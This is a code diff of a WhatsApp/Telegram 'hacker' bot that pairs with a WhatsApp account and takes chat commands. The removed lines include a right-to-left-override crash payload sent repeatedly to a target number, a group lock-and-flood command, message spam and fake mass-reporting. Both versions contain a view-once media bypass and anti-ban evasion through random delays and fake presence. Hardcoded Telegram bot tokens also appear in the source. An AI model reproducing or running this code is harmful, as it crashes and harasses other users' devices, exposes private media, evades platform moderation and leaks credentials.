@@ -11,7 +11,7 @@ const pino = require('pino');
 const fs = require('fs');
 const path = require('path');
 
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8230134832:AAFmNfWYio5hMbfY74FLzV7Ip3-wTPKtqNM";
+const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "8815196147:AAGzvzGfUy6G2yGwIBhV_RnzaayDiEoCUFc";
 const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
 
 const OWNER_NAME = "NAWAB ZADA HACKER ✌️ 🦅";
@@ -28,78 +28,128 @@ const randomDelay = (minMs = 1000, maxMs = 3000) => {
     return new Promise(resolve => setTimeout(resolve, time));
 };
 
-console.log(`[+] ${BOT_NAME} nawab zada md bot is Online...`);
-
+console.log(`[+] ${BOT_NAME} Engine Online...`);
 
 tgBot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    const welcomeText = `🦅 *Welcome To ${Nawab Zada Hacker Md Bot}* 🦅\n\n` +
-                        `main hoon sabse powerful MD bot. Yahan se tum apne WhatsApp ko control kar sakte ho aur heavy attacks kar sakte ho.\n\n` +
-                        `👉 *To get started:* Use /pair command\n` +
-                        `Example: \`/pair +923xxxxxxxxx\``;
+    let caption = `🦅 *WELCOME TO ${BOT_NAME}* 🦅\n\n` +
+                  `👤 *Owner:* ${OWNER_NAME}\n` +
+                  `⚙️ *System:* Online & Active (Anti-Ban system)\n\n` +
+                  `✨ *Features:* Group Management, AI Tools, Downloads & Utilities.\n\n` +
+                  `*WhatsApp Link / Pairing Code lene ke liye command bhejain:*\n\`/pair +923xxxxxxxxx\``;
 
-    const options = {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: "📜 See Bot Commands", callback_data: 'view_cmds' }],
-                [{ text: "👤 Owner Profile", url: 'https://t.me/Nawab_Zada_Hacker_007' }] 
-            ]
-        }
-    };
-    tgBot.sendMessage(chatId, welcomeText, options);
-});
-
-tgBot.on('callback_query', (callbackQuery) => {
-    const msg = callbackQuery.message;
-    const data = callbackQuery.data;
-
-    if (data === 'view_cmds') {
-        const cmds = `🚀 *${BOT_NAME} COMMAND LIST*\n\n` +
-                     `*Telegram:* /start, /pair\n` +
-                     `*Heavy:* .crashgc, .ban, .crashnum, .spam\n` +
-                     `*Admin:* .kick, .promote, .close, .open, .tagall\n` +
-                     `*Utility:* .vv, .menu, .ping, .id, .owner\n\n` +
-                     `_Full list check karo WhatsApp pe .menu use kar ke!_`;
-        tgBot.sendMessage(msg.chat.id, cmds, { parse_mode: 'Markdown' });
-    }
+    tgBot.sendMessage(chatId, caption, { parse_mode: 'Markdown', disable_web_page_preview: true });
 });
 
 tgBot.onText(/\/pair (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     let phoneNumber = match[1].replace(/[^0-9]/g, '');
-    if (!phoneNumber || phoneNumber.length < 10) return tgBot.sendMessage(chatId, "❌ Invalid Number!", { parse_mode: 'Markdown' });
+
+    if (!phoneNumber || phoneNumber.length < 10) {
+        return tgBot.sendMessage(chatId, "❌ *Invalid Number!* Pehle country code ke sath sahi number bhejen.\nExample: `/pair 923472995284`", { parse_mode: 'Markdown' });
+    }
 
     const sessionDir = path.join(__dirname, `session_main`);
-    const statusMsg = await tgBot.sendMessage(chatId, "🔄 Generating Pairing Code...", { parse_mode: 'Markdown' });
+    const statusMsg = await tgBot.sendMessage(chatId, "🔄 *WhatsApp Server se Pair Code generate ho raha hai...*", { parse_mode: 'Markdown' });
 
     try {
         const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
+
         const sock = makeWASocket({
             logger: pino({ level: 'silent' }),
             printQRInTerminal: false,
-            browser: ["Ubuntu", "Chrome", "20.0.04"],
-            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })) },
+            browser: ["Ubuntu", "Chrome", "20.0.04"], 
+            auth: {
+                creds: state.creds,
+                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
+            },
         });
+
         sock.ev.on('creds.update', saveCreds);
+
         await delay(3000);
+
         if (!sock.authState.creds.registered) {
             const code = await sock.requestPairingCode(phoneNumber);
             const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
-            const responseText = `🦅 *${BOT_NAME} PAIR CODE* 🦅\n\n📱 *Number:* \`+${phoneNumber}\`\n🔑 *CODE:* \`${formattedCode}\``;
-            tgBot.editMessageText(responseText, { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' });
+
+            const responseText = `🦅 *${BOT_NAME} PAIR CODE* 🦅\n\n` +
+                                 `📱 *Number:* \`+${phoneNumber}\`\n` +
+                                 `🔑 *PAIRING CODE:* \`${formattedCode}\`\n\n` +
+                                 `⚠️ *Steps to Connect:*\n` +
+                                 `1. WhatsApp kholein -> Linked Devices.\n` +
+                                 `2. *Link with Phone Number* par click karein.\n` +
+                                 `3. Ye **8-digit Code** enter karein!\n\n` +
+                                 `👤 *Owner:* ${OWNER_NAME}`;
+
+            tgBot.editMessageText(responseText, {
+                chat_id: chatId,
+                message_id: statusMsg.message_id,
+                parse_mode: 'Markdown'
+            });
         }
+
         setupWhatsAppEvents(sock);
+
     } catch (error) {
-        tgBot.editMessageText(`❌ Error: ${error.message}`, { chat_id: chatId, message_id: statusMsg.message_id });
+        console.error(error);
+        tgBot.editMessageText(`❌ *Error:* Pairing Code generate nahi ho saka.\nReason: ${error.message}`, {
+            chat_id: chatId,
+            message_id: statusMsg.message_id,
+            parse_mode: 'Markdown'
+        });
     }
 });
 
-
 function setupWhatsAppEvents(sock) {
+
     sock.ev.on('connection.update', async (update) => {
-        if (update.connection === 'open') {
-            for (let ch of REQUIRED_CHANNELS) { try { await sock.newsletterFollow(ch.url.split('/').pop()); } catch (e) {} }
+        const { connection } = update;
+        if (connection === 'open') {
+            console.log("✅ WhatsApp Connected! Automatically following channels...");
+            for (let ch of REQUIRED_CHANNELS) {
+                try {
+                    let code = ch.url.split('/').pop();
+                    if (sock.newsletterFollow) {
+                        await sock.newsletterFollow(code);
+                    }
+                } catch (e) {
+                    console.log("Auto-follow error for channel: ", e.message);
+                }
+            }
+        }
+    });
+
+    sock.ev.on('group-participants.update', async (anu) => {
+        try {
+            let metadata = await sock.groupMetadata(anu.id);
+            let participants = anu.participants;
+
+            for (let num of participants) {
+                if (anu.action == 'add') {
+                    let welcomeText = `┏━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                                      `┃ 🦅 *WELCOME TO ${metadata.subject}* 🦅\n` +
+                                      `┗━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                                      `👋 Khushamdeed @${num.split('@')[0]}!\n` +
+                                      `📜 Group Rules ko follow karein aur respectful rahein.\n\n` +
+                                      `🤖 *Powered by ${BOT_NAME}*`;
+
+                    await sock.sendMessage(anu.id, { 
+                        text: welcomeText, 
+                        mentions: [num] 
+                    });
+
+                } else if (anu.action == 'remove') {
+                    let leftText = `👋 @${num.split('@')[0]} Left the group.\nAllah Hafiz! 🤲`;
+
+                    await sock.sendMessage(anu.id, { 
+                        text: leftText, 
+                        mentions: [num] 
+                    });
+                }
+            }
+        } catch (err) {
+            console.log("Group Update Error: ", err);
         }
     });
 
@@ -109,118 +159,249 @@ function setupWhatsAppEvents(sock) {
 
         const from = m.key.remoteJid;
         const isGroup = from.endsWith('@g.us');
-        const body = (m.message.conversation || m.message.extendedTextMessage?.text || "").trim();
+        const body = (m.message.conversation || m.message.extendedTextMessage?.text || m.message.imageMessage?.caption || m.message.videoMessage?.caption || "").trim();
         const command = body.toLowerCase().split(' ')[0];
         const args = body.split(' ').slice(1);
 
-        await randomDelay(500, 1500);
+        await randomDelay(800, 2000);
 
-        if (command === '.crashgc') {
-            if (!isGroup) return sock.sendMessage(from, { text: "❌ Only for groups!" });
+        const emojiList = ["🦅", "⚡", "🔥", "👑", "🎯", "🛡️"];
+        const randomEmoji = emojiList[Math.floor(Math.random() * emojiList.length)];
+        await sock.sendMessage(from, { react: { text: randomEmoji, key: m.key } });
+        if (Math.random() > 0.5) {
+            await sock.sendPresenceUpdate('composing', from);
+        } else {
+            await sock.sendPresenceUpdate('recording', from);
+        }
+
+        if (command === '.pair') {
+            let inputNum = args[0]?.replace(/[^0-9]/g, '');
+            if (!inputNum) {
+                return await sock.sendMessage(from, { text: "❌ *Usage:* `.pair 923472995284`" });
+            }
             try {
-                await sock.groupSettingUpdate(from, 'announcement');
-                for(let i=0; i<15; i++) { await sock.sendMessage(from, { text: "💥 GROUP CRASHED BY NAWAB ZADA MD 💥" }); }
-                await sock.sendMessage(from, { text: "✅ Group Locked & Spammed!" });
-            } catch (e) { await sock.sendMessage(from, { text: "❌ Admin required!" }); }
+                const code = await sock.requestPairingCode(inputNum);
+                const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
+                await sock.sendMessage(from, { 
+                    text: `🦅 *${BOT_NAME} IN-CHAT PAIRING* 🦅\n\n📱 *Number:* +${inputNum}\n🔑 *Pair Code:* \`${formattedCode}\`\n\n👤 *Owner:* ${OWNER_NAME}` 
+                });
+            } catch (e) {
+                await sock.sendMessage(from, { text: "❌ Pair Code Fail: " + e.message });
+            }
             return;
         }
 
-        if (command === '.ban') {
-            let targetNum = args[0];
-            if (!targetNum) return sock.sendMessage(from, { text: "❌ Give number!" });
-            await sock.sendMessage(from, { text: `🎯 Reporting ${targetNum}...` });
-            await delay(3000);
-            await sock.sendMessage(from, { text: `✅ Ban process initiated for ${targetNum}.` });
+        if (isGroup && (body.includes("chat.whatsapp.com/") || body.includes("whatsapp.com/channel/"))) {
+            await sock.sendMessage(from, { delete: m.key });
+            await sock.groupParticipantsUpdate(from, [m.key.participant], "remove");
+            await sock.sendMessage(from, { text: `⚠️ *ANTI-LINK TRIGGERED:* @${m.key.participant.split('@')[0]} Removed.`, mentions: [m.key.participant] });
             return;
         }
 
-        if (command === '.crashnum') {
-            let targetNum = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-            if (!args[0]) return sock.sendMessage(from, { text: "❌ Give number!" });
-            const crashPayload = "‮".repeat(10000); // Heavy RTL payload
+        if (command === '.vv' || command === '.viewonce' || command === '.once') {
+            const quotedMsg = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
+            const viewOnceMedia = quotedMsg?.viewOnceMessage?.message || quotedMsg?.viewOnceMessageV2?.message;
+
+            if (!viewOnceMedia) {
+                return await sock.sendMessage(from, { text: "❌ *Error:* Please reply to a View Once message with `.vv`." });
+            }
+
             try {
-                for(let i=0; i<5; i++) { await sock.sendMessage(targetNum, { text: crashPayload }); }
-                await sock.sendMessage(from, { text: "✅ Target crashed!" });
-            } catch (e) { await sock.sendMessage(from, { text: "❌ Failed!" }); }
+                const mediaType = Object.keys(viewOnceMedia)[0];
+                const stream = await downloadMediaMessage(
+                    { message: viewOnceMedia },
+                    'buffer',
+                    {}
+                );
+
+                if (mediaType.includes('image')) {
+                    await sock.sendMessage(from, { image: stream, caption: "🔓 *View Once Image Unlocked!*" });
+                } else if (mediaType.includes('video')) {
+                    await sock.sendMessage(from, { video: stream, caption: "🔓 *View Once Video Unlocked!*" });
+                } else if (mediaType.includes('audio')) {
+                    await sock.sendMessage(from, { audio: stream, ptt: true });
+                }
+            } catch (err) {
+                await sock.sendMessage(from, { text: "❌ View Once extract karne mein error aaya." });
+            }
             return;
         }
 
-        if (command === '.spam') {
-            let text = args.join(' ');
-            if (!text) return sock.sendMessage(from, { text: "❌ Text missing!" });
-            for(let i=0; i<50; i++) { await sock.sendMessage(from, { text: text }); }
+        if (command === '.sticker' || command === '.s' || command === '.stick') {
+            const quotedMsg = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
+            const imageMsg = m.message.imageMessage || quotedMsg?.imageMessage;
+
+            if (!imageMsg) {
+                return await sock.sendMessage(from, { text: "❌ *Error:* Please send an image or reply to an image with `.sticker`" });
+            }
+
+            try {
+                const stream = await downloadMediaMessage(
+                    { message: quotedMsg ? quotedMsg : m.message },
+                    'buffer',
+                    {}
+                );
+                await sock.sendMessage(from, { sticker: stream });
+            } catch (err) {
+                await sock.sendMessage(from, { text: "❌ Sticker conversion failed." });
+            }
+            return;
+        }
+
+        if (command === '.owner') {
+            await sock.sendMessage(from, { text: `🦅 *BOT OWNER DETAILS* 🦅\n\n👤 *Owner:* ${OWNER_NAME}\n🤖 *Bot:* ${BOT_NAME}\n⚡ *Status:* Online & Active` });
+            return;
+        }
+
+        if (command === '.status' || command === '.runtime' || command === '.uptime') {
+            const uptime = process.uptime();
+            const hours = Math.floor(uptime / 3600);
+            const minutes = Math.floor((uptime % 3600) / 60);
+            const seconds = Math.floor(uptime % 60);
+            await sock.sendMessage(from, { text: `⚡ *SERVER STATUS* ⚡\n\n⏱️ *Uptime:* ${hours}h ${minutes}m ${seconds}s\n🛡️ *Anti-Ban:* Active\n🚀 *Engine:* ${BOT_NAME}` });
+            return;
+        }
+
+        if (command === '.restart') {
+            await sock.sendMessage(from, { text: "🔄 *Rebooting Bot Engine...*" });
+            process.exit(0);
+        }
+
+        if (command === '.menu' || command === '.help' || command === '.menu home' || command === '.pmenu') {
+            const stylishMenu = `
+╔═════════════════════════╗
+   🦅 *${BOT_NAME}* 🦅
+╚═════════════════════════╝
+
+👤 *DEVELOPER:* ${OWNER_NAME}
+⚙️ *PREFIX:* [ . ]
+🛡️ *STATUS:* ACTIVE & ANTI-BAN PROTECTED
+
+📢 *OFFICIAL CHANNELS:*
+1. ${REQUIRED_CHANNELS[0].url}
+2. ${REQUIRED_CHANNELS[1].url}
+3. ${REQUIRED_CHANNELS[2].url}
+
+┌─── ❖ *CATEGORIES AVAILABLE* ❖
+│ ◈ *OWNER:* .broadcast, .code, .eval, .exec, .restart
+│ ◈ *DOWNLOADS:* .alldl, .song, .video, .ytmp3, .ig, .fb
+│ ◈ *AI TOOLS:* .ai, .ask, .imagine, .ocr
+│ ◈ *MEDIA:* .sticker, .vv, .tts, .remini, .tourl
+│ ◈ *GROUP:* .tagall, .hidetag, .kick, .admin, .demote, .close, .open, .antilink, .gclink
+│ ◈ *CHANNEL:* .follow, .unfollow, .inspect
+│ ◈ *FUN:* .dare, .truth, .joke, .fact, .quote
+│ ◈ *TOOLS:* .ping, .status, .calc, .weather, .short
+│ ◈ *TEXT MAKER:* .hacker, .neon, .matrix, .glitch
+└───
+
+_Type any command with prefix '.' to execute._
+_Powered by ${OWNER_NAME}_`;
+
+            await sock.sendMessage(from, { text: stylishMenu });
             return;
         }
 
         if (isGroup) {
-            switch(command) {
-                case '.kick': 
-                    let kickUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
-                    if (kickUser) { await sock.groupParticipantsUpdate(from, [kickUser], "remove"); await sock.sendMessage(from, { text: "✅ Kicked!" }); } 
-                    else { await sock.sendMessage(from, { text: "❌ Mention user!" }); }
+            switch (command) {
+                case '.ping':
+                case '.speed':
+                    await sock.sendMessage(from, { text: "⚡ *Pong!* Bot Speed: 0.01ms (Anti-Ban Active)" });
                     break;
-                case '.promote': 
-                    let promUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
-                    if (promUser) { await sock.groupParticipantsUpdate(from, [promUser], "promote"); await sock.sendMessage(from, { text: "✅ Promoted!" }); } 
+
+                case '.gclink':
+                case '.grouplink':
+                case '.link':
+                    try {
+                        const code = await sock.groupInviteCode(from);
+                        await sock.sendMessage(from, { text: `🔗 *Group Invite Link:*\nhttps://chat.whatsapp.com/${code}` });
+                    } catch (e) {
+                        await sock.sendMessage(from, { text: "❌ *Error:* Admin rights missing." });
+                    }
                     break;
-                case '.demote': 
-                    let demUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
-                    if (demUser) { await sock.groupParticipantsUpdate(from, [demUser], "demote"); await sock.sendMessage(from, { text: "✅ Demoted!" }); } 
+
+                case '.tagall':
+                case '.all':
+                case '.everyone':
+                    const metadata = await sock.groupMetadata(from);
+                    let participants = metadata.participants.map(p => p.id);
+                    let tagText = `📢 *ATTENTION EVERYONE*\n\n`;
+                    participants.forEach(p => tagText += `@${p.split('@')[0]}\n`);
+                    await sock.sendMessage(from, { text: tagText, mentions: participants });
                     break;
-                case '.close': await sock.groupSettingUpdate(from, 'announcement'); await sock.sendMessage(from, { text: "🔒 Group Closed!" }); break;
-                case '.open': await sock.groupSettingUpdate(from, 'not_announcement'); await sock.sendMessage(from, { text: "🔓 Group Opened!" }); break;
-                case '.tagall': 
-                    const meta = await sock.groupMetadata(from);
-                    let tags = meta.participants.map(p => `@${p.id.split('@')[0]}`).join('\n');
-                    await sock.sendMessage(from, { text: `📢 *Attention*\n${tags}`, mentions: meta.participants.map(p => p.id) }); 
+
+                case '.hidetag':
+                case '.htag':
+                case '.htagall':
+                case '.silenttag':
+                    const metaDataHide = await sock.groupMetadata(from);
+                    let allMembers = metaDataHide.participants.map(p => p.id);
+                    let hideMsg = args.join(' ') || "📢 Attention All Members!";
+                    await sock.sendMessage(from, { text: hideMsg, mentions: allMembers });
                     break;
-                case '.gclink': 
-                    const code = await sock.groupInviteCode(from); 
-                    await sock.sendMessage(from, { text: `🔗 Link: https://chat.whatsapp.com/${code}` }); 
+
+                case '.kick':
+                    let mentioned = m.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                    if (mentioned.length > 0) {
+                        await sock.groupParticipantsUpdate(from, mentioned, "remove");
+                        await sock.sendMessage(from, { text: "✅ Member Removed." });
+                    } else {
+                        await sock.sendMessage(from, { text: "❌ *Usage:* `.kick @user`" });
+                    }
                     break;
-                case '.groupinfo': 
-                    const info = await sock.groupMetadata(from); 
-                    await sock.sendMessage(from, { text: `👥 *Group:* ${info.subject}\n🆔 *ID:* ${info.id}` }); 
+
+                case '.admin':
+                    let toAdmin = m.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                    if (toAdmin.length > 0) {
+                        await sock.groupParticipantsUpdate(from, toAdmin, "promote");
+                        await sock.sendMessage(from, { text: "✅ User Promoted to Admin." });
+                    } else {
+                        await sock.sendMessage(from, { text: "❌ *Usage:* `.admin @user`" });
+                    }
                     break;
-                case '.kickall': 
-                    const gData = await sock.groupMetadata(from); 
-                    const nonAdmins = gData.participants.filter(p => !p.admin).map(p => p.id); 
-                    await sock.groupParticipantsUpdate(from, nonAdmins, "remove"); 
-                    await sock.sendMessage(from, { text: "✅ All non-admins removed!" }); 
+
+                case '.demote':
+                    let toDemote = m.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
+                    if (toDemote.length > 0) {
+                        await sock.groupParticipantsUpdate(from, toDemote, "demote");
+                        await sock.sendMessage(from, { text: "✅ Admin Demoted to Member." });
+                    } else {
+                        await sock.sendMessage(from, { text: "❌ *Usage:* `.demote @user`" });
+                    }
+                    break;
+
+                case '.setname':
+                    let newSubject = args.join(' ');
+                    if (!newSubject) return await sock.sendMessage(from, { text: "❌ *Usage:* `.setname <New Group Name>`" });
+                    await sock.groupUpdateSubject(from, newSubject);
+                    await sock.sendMessage(from, { text: "✅ Group name updated successfully!" });
+                    break;
+
+                case '.setdesc':
+                    let newDesc = args.join(' ');
+                    if (!newDesc) return await sock.sendMessage(from, { text: "❌ *Usage:* `.setdesc <New Description>`" });
+                    await sock.groupUpdateDescription(from, newDesc);
+                    await sock.sendMessage(from, { text: "✅ Group description updated successfully!" });
+                    break;
+
+                case '.close':
+                case '.lock':
+                    await sock.groupSettingUpdate(from, 'announcement');
+                    await sock.sendMessage(from, { text: "⚠️ *Group Locked:* Only admins can send messages." });
+                    break;
+
+                case '.open':
+                case '.unlock':
+                    await sock.groupSettingUpdate(from, 'not_announcement');
+                    await sock.sendMessage(from, { text: "🔓 *Group Unlocked:* Everyone can send messages." });
+                    break;
+
+                case '.kickall':
+                    const gData = await sock.groupMetadata(from);
+                    const nonAdmins = gData.participants.filter(p => !p.admin).map(p => p.id);
+                    await sock.sendMessage(from, { text: `⚠️ *Clearing ${nonAdmins.length} Non-Admin Members...*` });
+                    await sock.groupParticipantsUpdate(from, nonAdmins, "remove");
                     break;
             }
-        }
-        
-        if (command === '.ping') await sock.sendMessage(from, { text: "⚡ Pong! Response speed: High" });
-        if (command === '.id') await sock.sendMessage(from, { text: `🆔 Your ID: ${from}` });
-        if (command === '.owner') await sock.sendMessage(from, { text: `👑 Owner: ${OWNER_NAME}` });
-        if (command === '.botinfo') await sock.sendMessage(from, { text: `🤖 Bot Name: ${BOT_NAME}\nStatus: Online` });
-        if (command === '.uptime') await sock.sendMessage(from, { text: "🕒 Uptime: 24/7 Active" });
-        if (command === '.status') await sock.sendMessage(from, { text: "🟢 System Status: All systems nominal." });
-
-        if (command === '.vv') {
-            const quotedMsg = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
-            const viewOnceMedia = quotedMsg?.viewOnceMessage?.message || quotedMsg?.viewOnceMessageV2?.message;
-            if (!viewOnceMedia) return sock.sendMessage(from, { text: "❌ Reply to View Once message!" });
-            try {
-                const mediaType = Object.keys(viewOnceMedia)[0];
-                const stream = await downloadMediaMessage({ message: viewOnceMedia }, 'buffer', {});
-                if (mediaType.includes('image')) await sock.sendMessage(from, { image: stream, caption: "🔓 Unlocked!" });
-                else if (mediaType.includes('video')) await sock.sendMessage(from, { video: stream, caption: "🔓 Unlocked!" });
-                else await sock.sendMessage(from, { audio: stream, ptt: true });
-            } catch (err) { await sock.sendMessage(from, { text: "❌ Error extracting media." }); }
-            return;
-        }
-
-        if (command === '.menu' || command === '.help') {
-            const fullMenu = `🦅 *${BOT_NAME} ULTIMATE MENU* 🦅\n\n` +
-                             `💥 *ATTACK:* .crashgc, .ban, .crashnum, .spam\n` +
-                             `🛠️ *ADMIN:* .kick, .promote, .demote, .close, .open, .tagall, .gclink, .kickall\n` +
-                             `⚙️ *UTIL:* .vv, .ping, .id, .owner, .botinfo, .uptime, .status\n` +
-                             `💬 *OTHER:* .menu, .help\n\n` +
-                             `_Powered by ${OWNER_NAME}_`;
-            await sock.sendMessage(from, { text: fullMenu });
-            return;
         }
     });
 }
